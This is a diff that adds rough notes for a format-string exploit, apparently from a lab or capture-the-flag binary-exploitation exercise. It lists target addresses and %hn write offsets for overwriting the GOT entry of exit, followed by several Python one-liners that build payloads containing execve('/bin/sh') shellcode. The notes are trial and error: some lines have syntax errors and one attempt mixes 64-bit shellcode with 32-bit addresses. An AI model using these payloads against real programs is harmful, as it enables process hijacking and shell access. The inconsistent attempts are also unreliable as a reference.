@@ -1,0 +1,64 @@
+
+
+[shellcode][target][formatting garbage]
+
+
+
+
+
+0xffffd69c <- shellcode begin
+0xffffd698 <- exit (0x080497e0)
+
+
+val1 val2 = 0xffffd69c
+
+ffff
+-4 - 30
+
+val 1 = 54902
+
+val 2 = 10595
+
+d69c
+
+[target adress][formatting madness][shellcode begins]
+
+%140x%10$hn%140x%11$hn
+
+
+
+final
+[target][shellcode][garbage]
+
+val 1
+val 2
+
+
+
+
+import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "%54902x%10$hn%10595x%11$hn"
+
+import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54902x%10$hn%10595x%11$hn0\x00" + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54964x%10$hn%10563x%11$hn0\x00" + "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81")
+
+
+%54902x%10$pz%10595x%11$pz
+
+%54964x%10$hn%10563x%11$hn0z
+
+%54964x%10$hn%10563x%11$hn0z
+aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+0xffffdde4
+
+
+56796
+
+8731
+
+import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%56802x%10$hn%8725x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+import struct; print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%55515x%10$hn%10012x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
